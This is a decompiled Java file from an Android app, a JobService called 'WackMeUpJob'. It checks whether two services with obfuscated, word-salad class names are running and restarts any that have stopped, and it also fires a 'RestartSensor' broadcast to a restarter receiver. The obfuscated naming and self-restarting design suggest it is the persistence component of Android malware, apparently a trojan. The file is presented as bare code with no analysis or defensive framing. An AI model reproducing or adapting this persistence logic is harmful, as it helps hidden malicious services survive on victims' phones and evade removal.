package com.appser;

import android.app.ActivityManager;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import java.util.List;

public class WackMeUpJob extends JobService {
    private int JobId = 100;

    public boolean onStopJob(JobParameters jobParameters) {
        return false;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));
        return 1;
    }

    public boolean onStartJob(JobParameters jobParameters) {
        try {
            if (!isServiceWork(this, verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class.getName())) {
                startService(new Intent(this, verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class));
            }
            if (isServiceWork(this, advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class.getName())) {
                return false;
            }
            startService(new Intent(this, advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class));
            return false;
        } catch (Exception unused) {
            return false;
        }
    }

    private boolean isServiceWork(Context context, String str) {
        List<ActivityManager.RunningServiceInfo> runningServices = ((ActivityManager) context.getSystemService("activity")).getRunningServices(100);
        if (runningServices == null) {
            return false;
        }
        for (ActivityManager.RunningServiceInfo runningServiceInfo : runningServices) {
            if (runningServiceInfo.service.getClassName().equals(str)) {
                return true;
            }
        }
        return false;
    }
}
